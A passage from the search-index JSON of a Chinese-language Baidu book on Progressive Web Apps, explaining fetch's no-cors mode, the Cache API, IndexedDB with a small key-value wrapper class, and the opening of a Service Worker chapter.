}) 对于图片、JS、CSS 等等这些类型的静态资源，如果通过对应的 HTML 标签加载这类跨域资源，是不会受到同源策略限制的，因此一般来说，存放静态资源的服务器并不需要设置 CORS。这就会对 Fetch API 请求这类静态资源带来影响。在默认情况下 fetch() 的请求模式为“no-cors”，在这种模式下请求跨域资源并不会报错，但是返回的 Response 对象将变得不透明，type 属性将变成“opaque”，无论服务端所返回的真实 status 是多少，在这种情况下都会变成 0，其他属性也都无法正常访问： // 假设当前页面 URL 为 https://current.com fetch('https://other.com/data.json', { mode: 'no-cors' }) .then(response => { console.log(response.status) // 0 console.log(response.type) // 'opaque' console.log(response.headers) // Headers {} console.log(response.body) // null }) 此时唯一能正常工作的方法是 clone()，即实现对 Response 对象的拷贝，当然拷贝得到的新对象也同样是不透明的。这种模式比较适用于在 Service Worker 线程中拦截静态资源请求并复制一份缓存到本地，只要将这类不透明的请求响应返回主线程，依然是能够正常工作的。下面的代码演示了 Service Worker 拦截跨域图片资源并将资源缓存到本地，然后在 fetch() 出错的时候再从缓存中读取资源： // service-worker.js self.addEventListener('fetch', event => { // 判断当前拦截到的请求为跨域图片资源 if (event.request.url === 'https://other-site.com/pic.jpg') { event.respondWith( // 优先发送网络请求获取最新的资源 fetch(event.request.url, {mode: 'no-cors'}) .then(response => { // 将请求得到的响应进行缓存 // 此时缓存的资源是不透明的 caches.open('cache-storage') .then(cache => cache.put(event.request.url, response.clone())) // 返回请求响应结果 return response }) .catch( // 请求失败时再使用缓存资源进行兜底 () => caches.open('cache-storage') .then(cache => cache.match(event.request.url)) ) ) ) } }) 在这种情况下，图片资源的 Response 对象是不透明的，因此整个操作过程无法对图片资源响应做任何检查判断，只能直存直取。这就有可能将真实状态码为 404、500 等错误响应给缓存下来，因此在“no-cors”模式下缓存的跨域资源的可信度不高，最好作为各类请求策略的兜底资源进行使用。 Copyright ©2019 Baidu BrilliantOpenWeb 本书采用 知识共享署名-非商业性使用 4.0 国际许可协议 进行许可。            该文件修订时间： 2019-05-22 14:25:16 "},"chapter03/4-cache-api.html":{"url":"chapter03/4-cache-api.html","title":"3.4 Cache API","keywords":"","body":"Cache API 在上一节 Fetch API 的介绍当中提到，Fetch API 提供了 Request、Response 等偏底层的类对象，这样就能够以统一的形式将资源的请求与响应过程应用到更多的场景当中。本节所介绍的 Cache API 就属于另一种资源请求与响应的场景，Cache API 提供了一系列方法实现了请求响应对象的缓存管理，因此它可以作为资源请求响应的缓存仓库，为 Service Worker 实现离线缓存提供基础支持。 接下来将介绍 Cache API 的使用方法。 兼容性检测 截止本书定稿之前，除了 IE 之外几乎所有主流浏览器的最新版本都支持了 Cache API，但保险起见，我们可以在主线程或者 Worker 线程中通过判断全局变量 caches 是否存在来检测浏览器是否支持 Cache API： if ('caches' in self) { console.log('当前环境支持 Cache API') } 打开 Cache 对象 通过 caches.open() 方法可以打开一个 Cache 对象，其语法为： caches.open(cacheName).then(cache => {/* 获得 Cache 对象 */}) 其中参数 cacheName 表示要打开的 Cache 对象的名称。该方法是异步方法，返回的 Promise 对象在 resolve 时会返回成功打开的 Cache 对象。打开 Chrome 开发者工具，切换到 Application - Cache Storage 选项卡可以观察到，在执行 caches.open() 方法时，会在 Cache Storage 下边建立同名仓库，每个仓库里面的内容就是操作对应的 Cache 对象后写入的资源缓存。 添加缓存 Cache 对象提供了 put()、add()、addAll() 三个方法来添加或者覆盖资源请求响应的缓存。需要注意的是，这些添加缓存的方法只会对 GET 请求起作用。 Cache.put(request, response) 资源请求响应在通过 Cache API 进行存储的时候，会以请求的 Request 对象作为键，响应的 Response 对象作为值，因此 put() 方法需要依次传入资源的请求和响应对象，然后生成键值对并缓存起来。下面举例说明它的使用方法： // 假设 cache 由 caches.open('v1') 打开 cache.put( new Request('/data.json'), new Response(JSON.stringify({name: 'lilei'})) ) 这样就给 v1 仓库写入了 '/data.json' 请求与响应的缓存。通过开发者工具可以明显地看到仓库当中新增的缓存条目信息： 同样，我们可以结合 Fetch API 来获取并存储服务端所返回的资源： fetch('/data.json').then(response => { if (response.ok) { cache.put(new Request('/data.json'), response) } }) 在 Fetch API 的章节中介绍了 Request 和 Response 都基于数据流实现，因此在进行缓存的时候需要格外留意 Response 对象的响应体数据是否已经被读取。 Cache.add(request) 和 Cache.addAll(requests) add() 和 addAll() 方法的功能类似于 Fetch API 结合 put() 方法实现对服务端资源的抓取和缓存。add() 和 addAll() 的区别在于，add() 只能请求和缓存一个资源，而 addAll() 能够抓取并缓存多个资源。有了这两个方法，缓存服务端资源将变得更为简单： cache.add('/data.json').then(() => {/* 缓存成功 */}) cache.addAll([ '/data.json', '/info.txt' ]) .then(() => {/* 缓存成功 */}) add() 和 addAll() 方法会缓存 Response.ok 为 true 的响应。同时请求跨域资源返回了不透明的 Response 对象，同样也会缓存下来。 查找缓存 cache.match() 和 cache.matchAll() 可以实现对缓存的查找。其中 match() 会返回第一个匹配条件的缓存结果，而 matchAll() 则会返回所有满足匹配条件的缓存结果。下面举例说明如何查找“/data.json”的缓存资源，相关代码如下所示： // 使用 match() 进行查找 cache.match('/data.json').then(response => { if (response == null) { // 没有匹配到任何资源 } else { // 成功匹配资源 } }) // 使用 matchAll() 进行查找 cache.matchAll('/data.json').then(responses => { if (!responses.length) { // 没有匹配到任何资源 } else { // 成功匹配到资源 } }) 上述查找方法可以传入第二参数来控制匹配过程，比如设置 ignoreSearch 参数，会在匹配过程中忽略 URL 中的 Search 部分，下面通过代码举例说明这一匹配过程： // 假设缓存的请求 URL 为 /data.json?v=1 cache.match('/data.json?v=2', {ignoreSearch: true}).then(response => { // 匹配成功 }) 在上面的例子当中，缓存的 URL 和用于匹配的 URL 都带有 Search 参数，但由于配置了 ignoreSearch 值为 true，因此最终仍然匹配成功。 获取匹配的请求 前面介绍的 match()、matchAll() 方法会返回匹配到的响应，但如果需要获取匹配到的请求，可以通过 cache.keys() 方法实现： cache.keys('/data.json', {ignoreSearch: true}).then(requests => { // requests 可能包含 /data.json、/data.json?v=1、/data.json?v=2 等等请求对象 // 如果匹配不到任何请求，则返回空数组 }) 如果没有传入任何参数，cache.keys() 会默认返回当前 Cache 对象中缓存的全部请求： cache.keys().then(requests => { // 返回全部请求对象 }) 删除缓存 通过 cache.delete() 方法可以实现对缓存的清理。其语法如下所示： cache.delete(request, options).then(success => { // 通过 success 判断是否删除成功 }) 比如要删除前面添加成功的“/data.json”请求，相关代码如下所示： cache.delete('/data.json').then(success => { // 将打印 true，代表删除成功 console.log(success) }) 假如删除一个未被缓存的请求，则执行删除后返回的 success 为 false： cache.delete('/no-cache.data').then(success => { // 将打印 false，代表删除失败 console.log(success) }) 在调用 cache.delete() 时可以传入第二参数去控制删除操作中如何匹配缓存，其格式与 match()、matchAll() 等匹配方法的第二参数一致。因此下面举例的删除过程能够忽略 Search 参数： // 假设缓存的请求 URL 为 /data.json?v=1.0.1 // 那么设置 ignoreSearch 之后同样也回删除该缓存 cache.delete('/data.json', {ignoreSearch: true}).then(success => { // /data.json?v=1.0.1 已被成功删除 }) Copyright ©2019 Baidu BrilliantOpenWeb 本书采用 知识共享署名-非商业性使用 4.0 国际许可协议 进行许可。            该文件修订时间： 2019-05-17 16:26:29 "},"chapter03/5-indexeddb.html":{"url":"chapter03/5-indexeddb.html","title":"3.5 IndexedDB","keywords":"","body":"IndexedDB Cache Storage 是一种缓存管理的缓存空间，前面了解到了 Cache Storage 是基于键值对的方式缓存数据，是适用于存储和检索网络请求及响应的存储系统，不能提供搜索功能，不能建立自定义的索引。IndexedDB 是浏览器环境提供的本地数据库，允许存储大量的数据，提供查询接口，还能创建索引等等。在存储结构上，数据库是存储一系列相关数据的容器，在每个域名下都可以新建多个数据库。IndexedDB 是一个非关系型的数据库，和平时所知道的关系型数据库（如 MySQL 等）有一定的区别，关系型数据库的内容是以记录为单位存储的，也就是说一条记录代表一条数据，而数据中的结构管理是通过记录的字段来指定存储的，而 IndexedDB 里面没有表和记录的概念，它的数据的最小单位是 JavaScript 对象（object），object 在 IndexedDB 里的地位就跟关系型数据库里面的记录一样，是数据的最终体现形式。 数据库存储结构上，关系型数据库和 IndexedDB 都可以划分为三个层次。 第一层：两者都有 database 的概念，要存储数据，首先要创建一个数据库。 第二层：两者就有了区别，关系型数据库有表的概念，而 IndexedDB 对应的是 objectStore。简单的说就是，在数据库中开辟一块 store 用来存储 object，同样，一个数据库中可以有多个（甚至无限个）objectStore。 第三层：关系型数据库有记录的概念，而 IndexedDB 直接存放 JavaScript 的 object 数据对象。 IndexedDB 存储的 object 是结构化数据。简单理解就是，不能存 function 等非结构化的数据，object 必须是以键值对组成的字面对象。并且支持嵌套结构，也就是说 object 里面嵌套了 object，和 JavaScript 实现无缝对接。而同样是本地化存储的 localStorage 却需要对数据格式化为字符串后才能保存。 HTML5 API 规范提供了一套 IndexedDB API, 可以使用 indexedDB.open() 方法来打开或者创建数据库，如下面代码所示： // 如果有 mydb 这个数据库，就直接打开 // 如果没有，就会创建 mydb 数据库 let request = window.indexedDB.open('mydb', 1) indexedDB.open() 方法有两个参数，第一个参数为数据库名，第二个参数为数据库版本。 IndexedDB 简介 IndexedDB 和关系型数据库的不同，主要体现在数据库存储结构设计上和数据操作方式上。下面介绍一些 IndexedDB 一些基本的概念，可以快速的了解 IndexedDB 的大致架构设计。 数据库版本 从 indexedDB.open() 方法的参数来看，很容易注意到 IndexedDB 存在版本的概念。例如：当数据库的 version 为 1 时，创建了一些 objectStore，当需要添加新的 objectStore 或者修改某些 objectStore 的时候，就需要升级 version。这时可能有两个不同的 version 1 和 2. 此时用 indexedDB.open() 方法打开一个 version 的时候，得到的 db 容器对应的 objectStore 是不同的，如果此时还要打开 version 为 1 的数据库，那么在 version 为 2 中创建的 objectStore 和新增的 object 都是不存在的。由其可见新的 version 一般包含了老的 version。 通常在代码操作中，你要时刻保证你使用对了 version，它的使用场景只有两种： 当需要修改 objectStore 时 当需要添加新的 objectStore 时 从代码的层面来看，并非这两个事情发生才触发了 version 的改变，恰恰相反，如果要修改或添加 objectStore，必须通过传递新的 version 参数到 indexedDB.open() 方法中，触发 onupgradeneeded 事件，在 onupgradeneeded 的回调函数中才能实现目的。从项目的开发上讲，只会在重新发布代码时去升级 version，而不会在程序运行过程中通过程序去更改 version。升级 version，是为了对数据库结构进行修改。 数据库容器 IndexedDB 中非常重要的概念是 transaction（事务），不过会在后面具体介绍事务。这里只需要了解一下调用 indexedDB.open() 方法之后如何操作数据库。要想操作 IndexedDB 数据，必须先创建一个数据库容器。操作数据库的存储结构以及数据的内容，都是要在数据库容器的基础上进行的，那怎么获得数据库容器呢？如下代码所示： let request = window.indexedDB.open('mydb', 1) request.onsuccess = e => { // db 就是数据库容器 let db = e.target.result // 使用 db 数据库容器，可以接着做一些数据处理 ... } IndexedDB 数据库的事件回调中都会在事件对象中带有数据库容器对象，可以通过 event.target.result 获取，在这个例子中是在 IndexedDB 数据库打开或者创建成功后通过 onsuccess 事件回调获取到了数据库容器。 对象仓库 objectStore 是 IndexedDB 中非常核心的概念，在前面的介绍中，也知道了它是数据的存储仓库，一个 objectStore 类似于关系型数据库中的表，存放着相关的所有数据。所谓的 “相关” 是指，这些 object 必须具备相同的一个属性名，也就是主键 ，在 IndexedDB 中被称之为 keyPath。这还有点像关系型数据库中的 primaryKey，不过关系型数据库中不必一定有 primaryKey，而 objectStore 中的 keyPath 必须有。 如果存入的某个 object 不存在那个属性，而该属性在 IndexedDB 中又不是 autoIncrement，那么就会报错，如果 autoIncrement 被设置为 true，在没有该 key 的情况下，存入数据库的时候，会被自动添加上，这个效果跟关系型数据的自增字段是一样的。 在使用事务对 objectStore 进行操作前，需要创建对应的 objectStore。创建 objectStore 和修改 objectStore 都只能在 db 的 onupgradeneeded 事件中进行，因此要创建 objectStore 必须在 indexedDB.open() 操作之后来进行，如下代码所示： let request = window.indexedDB.open('mydb', 1) request.onupgradeneeded = e => { let db = e.target.result db.createObjectStore('mystore', {keyPath: 'id'}) } 上面的代码中使用 db.createObjectStore() 方法来实现 objectStore 的创建。但是需要注意的是，一个 db 中是不允许同名的 objectStore 的，因此，如果第二次通过 createObjectStore() 创建相同名的 objectStore，程序会报错。 另外，一旦一个 objectStore 被创建，它的 name 和 keyPath 是不能修改的。可以通过 db.objectStoreNames 属性来判断是否已经存在同名的 objectStore 可以避免这个问题，如下代码所示： let request = window.indexedDB.open('mydb', 2) request.onupgradeneeded = e => { let db = e.target.result let objectStore // 如果不存在同名的 Store，就创建一个 if (!db.objectStoreNames.contains('mystore')) { objectStore = db.createObjectStore('mystore', {keyPath: 'id'}) } else { // 如果存在同名的 store，就直接取出来 objectStore = e.target.transaction.objectStore('mystore') } } 索引 在 IndexedDB 中也存在索引，但和关系型数据库中索引的作用不同，关系型数据库中的索引是对指定字段进行特殊记录，以方便在检索时提高检索性能。IndexedDB 中的索引，是指在除了设置的 keyPath 之外，提供其他的检索方式。在 IndexedDB 中，objectStore.get() 方法用来获取某一条数据，但是它的默认的参数是 keyPath 对应的值。而如果要用其他的字段来检索某个 object，那就麻烦了，所以 IndexedDB 提供了索引的方式，通过一个 index 方法来实现索引检索。所以看起来 objectStore 的索引，等效于关系型数据库中的表的字段。 前面反复提到 keyPath 这个概念。在前面的代码里面可以发现在 db.createObjectStore() 的时候，可以指定一个 keyPath。实际上，keyPath 的概念非常简单，它规定了必须要把 object 属性作为检索的入口。如 objectStore 中有一堆对象，如下所示： { id: 1, name: 'data1' } { id: 2, name: 'data2' } 如上代码所示，设置的 keyPath 为 id, 可以通过 objectStore.get(1) 方法来获取 keyPath 为 id = 1 的那条数据，因此，id 对于所有 object 而言是应该是唯一的。需要在建立索引的时候，传入一个 unique 参数确保唯一，所以实际上 db.createObjectStore() 的时候传入的 keyPath 是一个特殊的索引。创建索引实际上是对 objectStore 进行修改，因此，只能在数据库的 onupgradeneeded 事件中处理，如下代码所示： let request = window.indexedDB.open('mydb', 3) request.onupgradeneeded = e => { let db = e.target.result // 注意这里应该进行判断是否已经存在这个 objectStore，在这里略过 let objectStore = db.createObjectStore( 'mystore', {keyPath: 'id'} ) // 创建 id 为索引 objectStore.createIndex('id', 'id', {unique: true}) } objectStore 对象有一个 createIndex() 方法，它可以创建索引。它有三个参数: 第一个参数是这个索引的 name。 第二个参数是 key，这个 key 对应的就是 object 的属性名，name 是可以自己定的，它会用在后面的 index 方法中进行检索，也会被记录在 objectStore 的 indexNames 属性里面，但是 key 必须和 object 的属性对应。 第三个参数是 options，其中 unique 选项被放在这里面。 objectStore 本身的信息是不能修改的，例如 name 和 keyPath 都是不能修改的，但是它所拥有的索引可以被修改，修改其实就是删除或添加操作。删除用到的就是 objectStore.deleteIndex() 这个方法，如果想修改一个索引，要做的就是先删除掉原来的同名索引，然后添加新的索引，如下面代码所示： let request = window.indexedDB.open('mydb', 4) request.onupgradeneeded = e => { // 从事务中获取已经存在的 objectStore let objectStore = e.target.transaction.objectStore('mystore') let indexNames = objectStore.indexNames // 先删除对应的索引 if (indexNames.includes('name')) { objectStore.deleteIndex('name') } // 再重新创建一个新的同名索引 objectStore.createIndex('name', 'name', {unique: false}) } 事务 所有数据库中都有事务这个概念，它是为了确保当某些操作部分执行时不致混乱。举个简单的例子，当你转账给别人的时候，发起了一个请求，你的银行就操作从数据库里把相应的钱扣掉，但是这时候银行机房出问题了，你朋友的银行并没有收到这个转入的请求，那岂不是会出现你的钱已经扣了，但是别人并没有收到的情况？ 数据库系统为了避免这种情况，采用事务机制，如果出错那就回滚，把你打出去但对方没收到的钱回到你账上，重新再执行一次打钱的操作，这样就保证了数据库增删改有序不混乱。 IndexedDB 里面的事务也是一样，保证了所有操作（特别是写入操作）是按照一定的顺序进行，不会导致同时写入的问题。另外，IndexedDB 强制规定了任何 object 读写的操作都必须在一个事务中进行。从前面的代码里面你也看到了，对 objectStore 的修改其实也是在一个事务中进行。 在代码层面必须通过 db.transaction() 方法向数据库容器提出事务要求，才能对具体的 objectStore 进行数据处理： let request = window.indexedDB.open('mydb', 5) request.onsuccess = e => { let db = e.target.result let transaction = db.transaction( ['myObjectStore'], 'readonly' ) let objectStore = transaction.objectStore('myObjectStore') let objectRequest = objectStore.get('111') objectRequest.onsuccess = e => { // 获取到的数据 let object = e.target.result } } 上面这段代码的操作，得到了具体要进行操作的 objectStore，这与直接通过 db.objectStore('myObjectStore') 这样简洁的方法完全不同，IndexedDB 中不能这么直接去获取 objectStore，而必须通过 db.transaction() 方法。db.transaction() 方法有两个参数： objectStores：事务打算对哪些 objectStore 进行操作，因此是一个数组 mode：对进行操作的 objectStore 的模式，即读写权限控制，readonly | readwrite 而通过 transaction.objectStore() 方法可以获取想要操作的 objectStore ，但是它的参数必须存在于 db.transaction() 方法指定的 objectStores 参数数组中，毕竟这个事务已经规定了要对哪些 objectStore 进行操作。 因为 objectStore 是在事务中获取，因此一个 objectStore 实例，如果有一个 transaction 属性的话，那么可以通过这个属性找出它的事务的实例。在 IndexedDB 中，只能在事务中得到一个 objectStore 实例，如果通过 db 的话，最多只能得到 objectStore 的名字列表，如果要获得 objectStore 的实例，必须在 transaction 中。 操作请求 Request 是在事务过程中，发起某项操作的请求。一个事务过程中，可以有多个 Request，Request 一定存在于事务中，因此它肯定会有一个 transaction 属性来获取它所属于的那个事务的容器。我们可以把 transaction 当做一个队列，在这个队列中，Request 进行排队，每一个 Request 都只包含一个操作，比如添加，修改，删除数据之类的。这些操作不能马上进行，比如修改操作，如果马上进行，就会导致大家同时修改怎么办的问题，把多个修改操作放在 Request 中，这些 Request 在 transaction 中排队，一个一个处理，这样就会有执行的顺序，修改就有前后之分。同时，transaction 都可以被中断，这样当一系列的操作被放弃之后，后续的操作也不会进行。 而且有意思的是，Request 是异步的，它是有状态的。一个 Request 处于什么状态，可以通过 readyStates 属性查到，这对开发者而言也更可控。目前，在 IndexedDB 中，有四种情形产生 Request：open database，objectStore request, cursor request, index request。 游标 所谓游标，简单的理解，就是“一个用来记录数组正在被操作的某个下标位置的变量”，举个例子：对数组 [1, 2, 3, 4] 进行遍历，可以使用 forEach() 方法，那么 forEach() 方法怎么知道上次操作到第几个元素，又怎么知道现在应该操作第几个元素呢？就是通过游标来判断。 游标是一个机制，无法把游标打印出来看，可以通过游标得到你当前操作的元素，换句话说，游标有着类似 next() 的方法，可以用来移动游标到下一个位置。 当数据量巨大的时候，想要获取一个 objectStore 中的全部 object 可不是一件简单的事。IndexedDB 没有直接提供类似的方法来获取。但是可以利用游标来解决，如下代码所示： let request = window.indexedDB.open('mydb', 10) request.onsuccess = e => { let db = e.target.result let transaction = db.transaction( ['myObjectStore'], 'readonly' ) let objectStore = transaction.objectStore('myObjectStore') // 打开一个游标 let cursorRequest = objectStore.openCursor() let results = [] cursorRequest.onsuccess = e => { let cursor = e.target.result if (cursor) { results.push(cursor.value) cursor.continue() } else { // 遍历之后的 object 数据列表的结果 console.log(results) } } } 通过 objectStore.openCursor() 方法打开游标机制，该方法返回一个 Request 对象，在这个 Request 对象的 onsuccess 回调中，如果 cursor 没有遍历完所有 object，那么通过执行 cursor.continue() 来让游标滑动到下一个 object，onsucess 回调会被再次触发。而如果所有的 object 都遍历完了，cursor 变量会是 undefined。 注意上面的 results 变量，它的声明必须放在 onsuccess 回调函数的外部，因为该回调函数会在遍历过程中反复执行。 在 Firefox 浏览器中自主实现了一个 getAll() 方法可以获取 objectStore 中所有的 object，但是它不是标准的 IndexedDB 的接口，因此不推荐使用，而本例的操作方法，通常是获取全部 object 的标准做法。由此可以总结出游标就是对已知的集合对象（比如 objectStore 或 indexView）进行遍历，在 onsuccess 回调中使用 cursor.continue() 来进行控制。 主键范围 可以使用 IDBKeyRange 对象定义索引的范围。此对象有四种方法用于定义范围的限制：upperBound()、lowerBound()、bound() 和 only()。upperBound() 和 lowerBound() 方法指定了范围的上限和下限。可以通过 IDBKeyRange.lowerBound(indexKey) 方法指定索引的下边界，也可以使用 IDBKeyRange.upperBound(indexKey) 方法指定索引的上边界。当然还可以使用 bound() 方法同时指定上下边界：IDBKeyRange.bound(lowerIndexKey, upperIndexKey)。 接下来看一个代码示例：在 myObjectStore 对象库中的 price 属性上创建了一个索引，并添加了一个带有两个输入的小型表格，用于为游标设置范围的上限和下限。代码如下所示： function searchItems(lower, upper) { if (lower === '' && upper === '') { return } // 设置 let range if (lower !== '' && upper !== '') { range = IDBKeyRange.bound(lower, upper) } else if (lower === '') { range = IDBKeyRange.upperBound(upper) } else { range = IDBKeyRange.lowerBound(lower) } let request = window.indexedDB.open('mydb', 11) request.onsuccess = e => { let db = e.target.result let transaction = db.transaction( ['myObjectStore'], 'readonly' ) let store = transaction.objectStore('myObjectStore') let index = store.index('price') // 索引打开带有主键集合的游标 let cursorRequest = index.openCursor(range) let results = [] cursorRequest.onsuccess = e => { let cursor = e.target.result if (cursor) { console.log('游标位置在: ', cursor.key) results.push(cursor.value) cursor.continue() } else { // 遍历之后的 object 数据列表的结果 console.log(results) } } } } IndexedDB 的增删改查 和任何数据库一样，IndexedDB 也是进行数据存储，并提供一些方式让开发者可以对数据进行查询、添加、删除、修改。当一个事务开始之后，在它的生命周期以内，可以对 objectStore 进行数据操作，下面会通过一些简单的示例对 IndexedDB 的增删改查操作进行介绍。 获取数据 前面介绍过如何获取事务中的 objectStore，现在就用获取到的 objectStore 进行数据操作，如下代码所示。 let request = window.indexedDB.open('mydb', 6) request.onsuccess = e => { let db = e.target.result let transaction = db.transaction( ['myObjectStore'], 'readonly' ) let objectStore = transaction.objectStore('myObjectStore') let objectRequest = objectStore.get('100001') objectRequest.onsuccess = e => { // 获取到的数据 let object = e.target.result } } 在 IndexedDB 事务机制下进行操作是很麻烦的，上面代码中使用了 objectStore.get() 方法获取主键值为 100001 的 object，但是获取过程是一个 Request 对象，只有在其 onsuccess 事件中才能得到获取到的结果。 添加数据 let request = window.indexedDB.open('mydb', 7) request.onupgradeneeded = e => { let db = e.target.result let transaction = db.transaction( ['myObjectStore'], 'readwrite' ) let objectStore = transaction.objectStore('myObjectStore') // 写入一条数据 objectStore.add({ id: '100002', name: 'Zhang Fei', }) } 添加数据使用 objectStore.add() 方法，传入一个 object。但是这个 object 有限制，它的主键值，也就是 id 值，不能是已存在的，如果 objectStore 中已经有了这个 id，那么会报错。因此，在某些程序中为了避免这种情况的发生，通常会使用 objectStore.put() 方法。 更新数据 let request = window.indexedDB.open('mydb', 8) request.onupgradeneeded = e => { let db = e.target.result let transaction = db.transaction( ['myObjectStore'], 'readwrite' ) let objectStore = transaction.objectStore('myObjectStore') // 更新一条数据 objectStore.put({ id: '100002', name: 'Zhang San', }) } objectStore.put() 方法和 objectStore.add() 方法有两大区别。 如果 objectStore 中已经有了该id，则表示更新这个object，如果没有，则添加这个 object。 在另一种情况下，也就是设置了 autoIncrement 为 true 的时候，也就是主键自增的时候，objectStore.put() 方法必须传第二个参数，第二个参数是主键的值，以此来确定你要更新的是哪一个主键对应的 object，如果不传的话，可能会直接增加一个 object 到数据库中。从这一点上讲，自增字段确实比较难把握，因此我建议开发者严格自己在传入时保证 object 中存在主键值。 删除数据 let request = window.indexedDB.open('mydb', 9) request.onupgradeneeded = e => { let db = e.target.result let transaction = db.transaction( ['myObjectStore'], 'readwrite' ) let objectStore = transaction.objectStore('myObjectStore') // 删除一条数据 objectStore.delete('100001') } objectStore.delete() 方法将传入的主键值对应的 object 从数据库中删除。 利用 IndexedDB 实现 DB 类 接下来利用 IndexedDB 实现一个 DB 类，将 IndexedDB 的数据存储模式简化为键值对的形式，并实现一些常用的 setItem/getItem/getAllItems/removeItem 等方法。这样我们就可以通过 DB 类的实例，以类似 localStorage 的 API 去使用 IndexedDB 了。 构造函数 在初始化时，需要传入 dbName、version、storeName 三个参数，分别对应数据库名、数据库版本号、对象仓库名： class DB { constructor ({ dbName = 'db', version = 1, storeName }) { this.dbName = dbName this.storeName = storeName this.version = version } // ... } 其中 dbName 和 version 我们设置了默认值，因此在实例化 DB 类的时候，只需要传入 storeName 即可： const db = new DB({storeName: 'test'}) 获取数据库实例 接下来封装 getDB() 方法来获得数据库实例，并且在数据库初始化时创建对象仓库，由于在这里我们使用键值对的存储形式，因此规定存储对象结构为：{key, value} ，其中 key 存放数据的键名，value 存放值。同时由于 IndexedDB 采用回调函数的异步机制，我们可以通过实现简单的 promisify 方法将回调修改成 Promise 的异步形式。具体实现如下所示： class DB { // ... async getDB () { // 优先返回缓存的数据库实例 if (this.db) { return this.db } // 打开数据库 let request = indexedDB.open(this.dbName, this.version) // 当数据库初始化或升级时创建仓库 request.onupgradeneeded = event => { let db = event.target.result // 当仓库不存在时创建仓库，同时规定 key 为索引 if (!db.objectStoreNames.contains(this.storeName)) { db.createObjectStore(this.storeName, {keyPath: 'key'}) } } let event = await promisify(request) this.db = event.target.result return this.db } } 其中 promisify() 方法实现如下： function promisify (request) { return new Promise((resolve, reject) => { request.onsuccess = resolve request.onerror = reject }) } 这样我们就可以通过 getDB() 方法初始化好仓库，并最终获得数据库实例，接下来就可以实现其他操作数据库的方法了。 写入数据 setItem() setItem() 用于将数据写入 indexedDB，它接收两个参数分别为 key 和 value，其中 key 要求为字符串类型，value 为 IndexedDB 允许存储的类型即可。 class DB { // ... async setItem (key, value) { // 获取数据库 let db = await this.getDB() // 创建事务，指定使用到的仓库名以及读写权限 let transaction = db.transaction([this.storeName], 'readwrite') // 获取仓库实例 let objectStore = transaction.objectStore(this.storeName) // 将 key 和 value 包装成对象 {key, value} 并存入仓库 let request = objectStore.put({key, value}) // 异步执行结果通过 Promise 返回 return promisify(request) } } 通过 setItem() 方法，我们就可以方便地写入数据了： // 存入数字 db.setItem('number', 1) .then(() => {console.log('写入成功！')}) // 存入 Plain Object db.setItem('/path/to/data', {status: 0, data: 'Hello World'}) .then(() => {console.log('写入成功！')}) 读取数据 getItem() 与 getAll() getItem() getItem() 用于获取数据，它接收参数 key，作为查找资源的标识： class DB { // ... async getItem (key) { // 获取数据库实例 let db = await this.getDB() // 创建事务，并指定好仓库名以及操作的只读权限 let transaction = db.transaction([this.storeName], 'readonly') // 获取仓库实例 let objectStore = transaction.objectStore(this.storeName) // 查找对应的数据并通过 Promise 对象包装后返回 let request = objectStore.get(key) let event = await promisify(request) return event.target.result && event.target.result.value } } 使用 getItem() 读取数据的方法也非常简单： db.getItem('number') // 打印 1 .then(value => console.log(value)) db.getItem('/path/to/data') // 打印 {status: 0, data: 'Hello World'} .then(value => console.log(value)) getAll() getAll() 用于获取数据库的全部数据，返回的结果为 Promise 包装的 Map 对象： class DB { // ... async getAll () { // 获取数据库实例 let db = await this.getDB() // 创建事务，并指定好仓库名以及操作的只读权限 let transaction = db.transaction([this.storeName], 'readonly') // 获取仓库实例 let objectStore = transaction.objectStore(this.storeName) // 读取仓库全部数据 let request = objectStore.getAll() let event = await promisify(request) let result = event.target.result // 当数据为空时，返回空 if (!result || !result.length) { return } // 数据不为空时，将数据包装成 Map 对象并返回 let map = new Map() for (let {key, value} of result) { map.set(key, value) } return map } } 这样通过 getAll() 方法就可以异步获取仓库中存储的全部数据了： db.getAll() // 打印 Map(2) { // 'number' => 1, // '/path/to/data': {status: 0, data: 'Hello World'} // } .then(map => console.log(map)) 删除数据 removeItem() removeItem() 用于删除数据，通过参数 key 进行数据匹配并删除： class DB { // ... async removeItem (key) { // 获取数据库实例 let db = await this.getDB() // 创建事务，并指定好仓库名以及删除操作的读写权限 let transaction = db.transaction([this.storeName], 'readwrite') let objectStore = transaction.objectStore(this.storeName) // 删除数据，并用 Promise 进行包裹 let request = objectStore.delete(key) return promisify(request) } } 这样删除数据操作可以简化为如下形式： db.removeItem('number') // 数据删除成功时 Promise 对象执行 resolve .then(() => console.log('删除成功')) Copyright ©2019 Baidu BrilliantOpenWeb 本书采用 知识共享署名-非商业性使用 4.0 国际许可协议 进行许可。            该文件修订时间： 2019-05-22 14:25:16 "},"chapter04.html":{"url":"chapter04.html","title":"第4章 Service Worker","keywords":"","body":"Service Worker Service Worker 是 PWA 技术基础之一，脱离浏览器主线程的特性，使得 Web App 离线缓存成为可能，更为后台同步、通知推送等功能提供了思路。Service Worker 和缓存之间的关系，可以理解为 Service Worker 是一种调度机制，类似于铁路调度系统，而缓存则类似于具体的火车，可以是绿皮车、动车、高铁等，所有的车都是基于这一套铁路调度系统在工作的，使用 Service Worker 可以在不同场景下更加精细化控制缓存。 本章中会深入 Service Worker 的技术细节，介绍 Service Worker 注册方法、生命周期以及更新机制等内容，并学习如何调试 Service Worker。掌握这些基本的知识，可以让我们更容易理解 PWA 离线缓存机制的实现原理。 Copyright ©2019 Baidu BrilliantOpenWeb 本书采用 知识共享署名-非商业性使用 4.0 国际许可协议 进行许可。            该文件修订时间： 2019-05-17 16:26:29 "},"chapter04/1-service-worker-introduction.html":{"url":"chapter04/1-service-worker-introduction.html","title":"4.1 Service Worker 简介","keywords":"","body":"Service Worker 简介 丢失网络连接是一个困扰 Web 用户多年的难题，即使是世界上最好的 Web App，如果因为网络原因访问不了它，那体验也是非常糟糕的。本小节要介绍的 Service Worker 能提供一种良好的统筹机制对资源缓存和网络请求进行缓存和处理，是 PWA 实现离线可访问、稳定访问、静态资源缓存的一项重要技术。 通常所讲的 Service Worker 指的是 Service Worker 线程。了解浏览器工作原理的开发者都知道浏览器中执行的 JavaScript 文件是运行在一个单一线程上，称之为 主线程。而 Service Worker 是一种独立于浏览器主线程的 工作线程，与当前的浏览器主线程是完全隔离的，并有自己独立的执行上下文（context）。 首先借一个简单的例子来了解一下什么是 Service Worker，假如现在有一个最简单的前端项目 serviceWorkerDemo ，目录结构如下： . └── serviceWorkerDemo ├── index.html └── sw.js index.html 文件的内容如下： Service Worker Demo navigator.serviceWorker.register('./sw.js') HTML5 提供的一个 Service Worker API，能够进行 Service Worker 线程的注册、注销等工作，在该示例中，通过 